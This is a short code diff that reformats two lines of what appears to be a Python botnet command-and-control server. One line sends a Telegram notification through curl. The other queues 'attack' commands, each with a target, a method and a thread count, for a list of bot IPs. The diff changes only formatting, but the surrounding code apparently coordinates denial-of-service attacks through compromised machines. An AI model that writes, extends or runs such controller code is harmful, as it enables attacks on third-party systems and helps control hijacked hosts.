@@ -20,7 +20,11 @@ def telegram_notify(msg):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID):
         return
     try:
-        subprocess.run(["curl", "-s", "-X", "POST", f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", "-d", f"chat_id={TELEGRAM_CHAT_ID}&text={msg}"], timeout=5)
+        subprocess.run([
+            "curl", "-s", "-X", "POST",
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            "-d", f"chat_id={TELEGRAM_CHAT_ID}&text={msg}"
+        ], timeout=5)
     except:
         pass
 
@@ -83,7 +87,8 @@ async def handle_client(reader, writer):
             target, method, threads = parts[0], parts[1], parts[2]
             bot_ips = parts[3].split(",") if len(parts) > 3 else list(bots.keys())
             for bot_ip in bot_ips:
-                commands_queue.setdefault(bot_ip, []).append({"type": "attack", "target": target, "method": method, "threads": int(threads)})
+                commands_queue.setdefault(bot_ip, []).append(
+                    {"type": "attack", "target": target, "method": method, "threads": int(threads)})
             save_commands()
             writer.write(b"commands queued")
         else:
